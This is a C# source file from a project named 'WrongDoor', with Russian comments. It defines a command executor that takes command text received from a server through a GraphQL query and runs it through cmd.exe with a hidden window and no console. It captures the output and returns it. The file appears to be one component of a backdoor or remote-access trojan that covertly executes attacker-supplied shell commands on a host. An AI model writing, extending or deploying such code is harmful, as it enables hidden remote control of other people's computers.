using System.Diagnostics;
using System.Threading.Tasks;
using WrongDoor.Connector;

namespace WrongDoor.MainServer.CommandExutors
{
    public class CommandLineExecutor : BaseExecutor
    {
        public async Task<string> Execute(GetCommandsGQL.Response.CommandSelection command)
        {
            ProcessStartInfo process_options = new ProcessStartInfo(@"cmd.exe", @"/C " + command.body)
            {
                // скрываем окно запущенного процесса
                WindowStyle = ProcessWindowStyle.Hidden,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            // запускаем процесс
            Process process = Process.Start(process_options);

            // получаем ответ запущенного процесса
            var outp = process.StandardError.ReadToEnd();
            outp += process.StandardOutput.ReadToEnd();

            // закрываем процесс
            process.WaitForExit();

            // выводим результат
            return (outp);
        }
    }
}
